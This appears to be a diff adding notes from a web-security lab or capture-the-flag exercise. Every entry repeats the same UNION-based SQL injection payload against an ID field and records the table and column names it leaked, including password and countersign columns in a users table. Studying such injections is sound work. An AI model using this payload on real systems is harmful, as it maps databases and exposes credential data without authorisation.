@@ -1,0 +1,66 @@
+ID: 1 AND 1=0 UNION  SELECT column_name, table_name FROM information_schema.columns 
+First name: id
+Surname : db_default
+ID: 1 AND 1=0 UNION  SELECT column_name, table_name FROM information_schema.columns 
+First name: username
+Surname : db_default
+ID: 1 AND 1=0 UNION  SELECT column_name, table_name FROM information_schema.columns 
+First name: password
+Surname : db_default
+ID: 1 AND 1=0 UNION  SELECT column_name, table_name FROM information_schema.columns 
+First name: user_id
+Surname : users
+ID: 1 AND 1=0 UNION  SELECT column_name, table_name FROM information_schema.columns 
+First name: first_name
+Surname : users
+ID: 1 AND 1=0 UNION  SELECT column_name, table_name FROM information_schema.columns 
+First name: last_name
+Surname : users
+ID: 1 AND 1=0 UNION  SELECT column_name, table_name FROM information_schema.columns 
+First name: town
+Surname : users
+ID: 1 AND 1=0 UNION  SELECT column_name, table_name FROM information_schema.columns 
+First name: country
+Surname : users
+ID: 1 AND 1=0 UNION  SELECT column_name, table_name FROM information_schema.columns 
+First name: planet
+Surname : users
+ID: 1 AND 1=0 UNION  SELECT column_name, table_name FROM information_schema.columns 
+First name: Commentaire
+Surname : users
+ID: 1 AND 1=0 UNION  SELECT column_name, table_name FROM information_schema.columns 
+First name: countersign
+Surname : users
+ID: 1 AND 1=0 UNION  SELECT column_name, table_name FROM information_schema.columns 
+First name: id_comment
+Surname : guestbook
+ID: 1 AND 1=0 UNION  SELECT column_name, table_name FROM information_schema.columns 
+First name: comment
+Surname : guestbook
+ID: 1 AND 1=0 UNION  SELECT column_name, table_name FROM information_schema.columns 
+First name: name
+Surname : guestbook
+ID: 1 AND 1=0 UNION  SELECT column_name, table_name FROM information_schema.columns 
+First name: id
+Surname : list_images
+ID: 1 AND 1=0 UNION  SELECT column_name, table_name FROM information_schema.columns 
+First name: url
+Surname : list_images
+ID: 1 AND 1=0 UNION  SELECT column_name, table_name FROM information_schema.columns 
+First name: title
+Surname : list_images
+ID: 1 AND 1=0 UNION  SELECT column_name, table_name FROM information_schema.columns 
+First name: comment
+Surname : list_images
+ID: 1 AND 1=0 UNION  SELECT column_name, table_name FROM information_schema.columns 
+First name: id_vote
+Surname : vote_dbs
+ID: 1 AND 1=0 UNION  SELECT column_name, table_name FROM information_schema.columns 
+First name: vote
+Surname : vote_dbs
+ID: 1 AND 1=0 UNION  SELECT column_name, table_name FROM information_schema.columns 
+First name: nb_vote
+Surname : vote_dbs
+ID: 1 AND 1=0 UNION  SELECT column_name, table_name FROM information_schema.columns 
+First name: subject
+Surname : vote_dbs
